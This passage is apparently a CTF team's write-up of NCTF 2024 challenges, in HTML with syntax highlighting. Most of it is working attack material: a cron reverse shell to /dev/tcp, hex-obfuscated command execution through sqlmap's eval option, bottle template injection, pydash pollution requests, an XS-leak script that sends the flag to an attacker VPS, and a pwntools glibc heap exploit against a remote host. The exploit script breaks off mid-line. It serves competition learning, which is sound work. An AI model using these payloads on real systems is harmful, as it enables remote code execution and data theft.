class=\"token punctuation\">..</span>//<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>//etc/crontab\n\n<span class=\"token assign-left variable\"><span class=\"token environment constant\">SHELL</span></span><span class=\"token operator\">=</span>/bin/sh\n\n<span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n* * * * * root /bin/bash <span class=\"token parameter variable\">-c</span> <span class=\"token string\">'bash -i >&amp; /dev/tcp/IP/PORT 0>&amp;1'</span></code></pre>\n\n<p>获得shell后寻找flag</p>\n<pre class=\"language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\">#linux命令：</span>\n<span class=\"token function\">find</span> / <span class=\"token parameter variable\">-type</span> f <span class=\"token parameter variable\">-exec</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-l</span> <span class=\"token parameter variable\">-i</span> <span class=\"token string\">\"nctf\"</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> + <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null\n\n<span class=\"token comment\">#Out:</span>\n/proc/1/task/1/environ\n\n<span class=\"token comment\">#linux命令：</span>\n<span class=\"token function\">cat</span> /proc/1/task/1/environ\n\n<span class=\"token comment\">#Out：</span>\n<span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME<span class=\"token operator\">=</span>comp-xlcrypsc-67706716887745083pclt4FLAG<span class=\"token operator\">=</span>nctf<span class=\"token punctuation\">&#123;</span>760bd839-02ff-4b4f-b5a9-3b006910963a<span class=\"token punctuation\">&#125;</span>KUBERNETES_PORT<span class=\"token operator\">=</span>tcp://192.168.0.1:443KUBERNETES_PORT_443_TCP<span class=\"token operator\">=</span>tcp://192.168.0.1:443KUBERNETES_PORT_443_TCP_PROTO<span class=\"token operator\">=</span>tcpKUBERNETES_PORT_443_TCP_PORT<span class=\"token operator\">=</span>443KUBERNETES_PORT_443_TCP_ADDR<span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.0.1KUBERNETES_SERVICE_HOST<span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.0.1KUBERNETES_SERVICE_PORT<span class=\"token operator\">=</span>443KUBERNETES_SERVICE_PORT_HTTPS<span class=\"token operator\">=</span>443HOME<span class=\"token operator\">=</span>/root\n</code></pre>\n\n<h3 id=\"QRcode-Reconstruction\"><a href=\"#QRcode-Reconstruction\" class=\"headerlink\" title=\"QRcode Reconstruction\"></a>QRcode Reconstruction</h3><p><img src=\"/images/1742737001478-793cdfb8-490c-40bc-939e-41e4ccc41789.png\" loading=\"lazy\">手搓。</p>\n<p>最后decode是</p>\n<p><img src=\"/images/1742737035701-dfd8da36-52fa-4ed1-b08c-ee997cda532a.png\" loading=\"lazy\"></p>\n<p>猜到flag是nctf{WeLc0mE_t0_Nctf_2024!!!}</p>\n<h2 id=\"CRYPTO\"><a href=\"#CRYPTO\" class=\"headerlink\" title=\"CRYPTO\"></a>CRYPTO</h2><p>爆零O.o</p>\n","excerpt":"","more":"<h1 id=\"战队名：不知道\"><a href=\"#战队名：不知道\" class=\"headerlink\" title=\"战队名：不知道\"></a>战队名：不知道</h1><p><strong>排名：6</strong></p>\n<p>成员：LamentXU、Jerrythepro123、lianjin、Liv</p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><img src=\"/images/1742736030430-b261e9ef-7633-418b-a3ba-ea5ac98f12ca.png\"></h2><h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><p>拉门特许超级无敌详细版：</p>\n<blockquote>\n<p><a href=\"https://www.cnblogs.com/LAMENTXU/articles/18799383\">https://www.cnblogs.com/LAMENTXU/articles/18799383</a></p>\n</blockquote>\n<h3 id=\"sqlmap-master\"><a href=\"#sqlmap-master\" class=\"headerlink\" title=\"sqlmap-master\"></a>sqlmap-master</h3><p>签到题。</p>\n<p>sqlmap有个–exec可以执行。直接执行会有编码问题（我也不知道为什么）。但是可以用fromhex绕</p>\n<p>payload：</p>\n<blockquote>\n<p>127.0.0.1?id&#x3D;1 –eval&#x3D;exec(bytes.fromhex(‘5F5F696D706F72745F5F28276F7327292E73797374656D2827656E762729’))</p>\n</blockquote>\n<h3 id=\"ez-dash\"><a href=\"#ez-dash\" class=\"headerlink\" title=\"ez_dash\"></a>ez_dash</h3><p>我是第一个报告非预期的（大声）</p>\n<p>根本不需要污染。bottle里&lt;%也可以执行，waf没禁完。</p>\n<p>直接打abort回显。秒了。</p>\n<blockquote>\n<p>GET &#x2F;render?path&#x3D;&lt;%%20from%20bottle%20import%20abort%0afrom%20subprocess%20import%20getoutput%0aa&#x3D;getoutput(“env”)%0aabort(404,a)%20%&gt;</p>\n</blockquote>\n<h3 id=\"ez-dash-revenge\"><a href=\"#ez-dash-revenge\" class=\"headerlink\" title=\"ez_dash_revenge\"></a>ez_dash_revenge</h3><p>首先污染掉pydash的helpers.RESTRICTED_KEYS，不然拿不到__globals__</p>\n<blockquote>\n<p>POST &#x2F;setValue?name&#x3D;pydash HTTP&#x2F;1.1</p>\n<p>{</p>\n<p>“path”: “helpers.RESTRICTED_KEYS”,</p>\n<p>“value”: “123”</p>\n<p>}</p>\n</blockquote>\n<p>然后setval找globals找bottle。改templete的路径，加一个&#x2F;proc&#x2F;self</p>\n<blockquote>\n<p>POST &#x2F;setValue?name&#x3D;setval HTTP&#x2F;1.1</p>\n<p>{</p>\n<p>“path”: “<strong>globals</strong>.bottle.TEMPLATE_PATH”,</p>\n<p>“value”: [“.&#x2F;“,”.&#x2F;views&#x2F;“,</p>\n<pre><code>&quot;/proc/self/&quot;\n</code></pre>\n<p>]</p>\n<p>}</p>\n</blockquote>\n<p>随后直接render?path&#x3D;environ即可</p>\n<h3 id=\"internal-api\"><a href=\"#internal-api\" class=\"headerlink\" title=\"internal_api\"></a>internal_api</h3><p>XS_leak，通过请求码来泄露。</p>\n<p>exp：</p>\n<pre class=\"language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UTF-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>width=device-width, initial-scale=1.0<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>Error-Based Attack<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n        <span class=\"token keyword\">let</span> currentFlag <span class=\"token operator\">=</span> <span class=\"token string\">\"nctf&#123;\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> chars <span class=\"token operator\">=</span> <span class=\"token string\">\"abcdef0123456789-&#123;&#125;\"</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">function</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">ms</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span> <span class=\"token operator\">=></span> <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span>resolve<span class=\"token punctuation\">,</span> ms<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">function</span> <span class=\"token function\">checkCharacter</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">char</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">let</span> script <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">'script'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                script<span class=\"token punctuation\">.</span>src <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">http://0.0.0.0:8000/internal/search?s=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>currentFlag<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>char<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span>\n\n                script<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onload</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n                    document<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">.</span><span class=\"token function\">removeChild</span><span class=\"token punctuation\">(</span>script<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n                script<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onerror</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n                    document<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">.</span><span class=\"token function\">removeChild</span><span class=\"token punctuation\">(</span>script<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n                document<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>script<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">bruteforce</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>currentFlag<span class=\"token punctuation\">.</span><span class=\"token function\">endsWith</span><span class=\"token punctuation\">(</span><span class=\"token string\">'&#125;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> char <span class=\"token keyword\">of</span> chars<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token keyword\">const</span> isCorrect <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">checkCharacter</span><span class=\"token punctuation\">(</span>char<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>isCorrect<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                            currentFlag <span class=\"token operator\">+=</span> char<span class=\"token punctuation\">;</span>\n                            window<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">http://VPS:8000/?flag=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>currentFlag<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                            <span class=\"token keyword\">await</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                        <span class=\"token punctuation\">&#125;</span>\n                        <span class=\"token keyword\">await</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                window<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">http://VPS:8000/?error=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>currentFlag<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token function\">bruteforce</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre>\n\n<p>VPS起这个服务，bot访问即可</p>\n<p><img src=\"/images/1742736741383-899b4fa3-fb61-4084-8d13-d712ca7d9aa2.png\"></p>\n<h2 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h2><h3 id=\"unauth-diary\"><a href=\"#unauth-diary\" class=\"headerlink\" title=\"unauth-diary\"></a>unauth-diary</h3><p>先创造largebin来泄漏libc和堆地址，之后创造一个大小为-1的堆块，这样可以溢出来打tcache poisioning。用stdout结构体打house of apple来调用setcontext来写rop。rop用dup2来改输入输出的fd，这样就能拿到shell了。</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#io=process(\"\")</span>\n<span class=\"token comment\">#io=remote(\"localhost\",9999)</span>\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"39.106.16.204\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33245</span><span class=\"token punctuation\">)</span>\nr <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nrl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>    a<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nru <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>    <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsa <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nshell <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">view</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"4\"</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    free<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x200</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x300</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n\nview<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nlibc<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x203b00</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span>\n\nview<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nheap<span class=\"token operator\">=</span>u64<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">0x1200</span>\n<span class=\"token keyword\">print</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>heap<span class=\"token punctuation\">)</span>\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/bin/sh\\0\"</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#7</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x101</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\nfree<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\nfree<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span>\n\nstdout<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x2045c0</span>\nio_list_all<span class=\"token operator\">=</span>libc<span class=\"token operator\">+</span><span class=\"token number\">0x2044c0</span>\ntarget<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>io_list_all<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span>heap<span class=\"token operator\">+</span><span class=\"token number\">0x1060</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>></span><span class=\"token number\">12</span>\ntarget1<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span>heap<span class=\"token operator\">+</span><span class=\"token number\">0x1080</span><span class=\"token punctuation\">)</span><span class=\"token operator\">>></span><span class=\"token number\">12</span>\n\np<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">0x10</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x21</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span>\np<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x111</span><span class=\"token 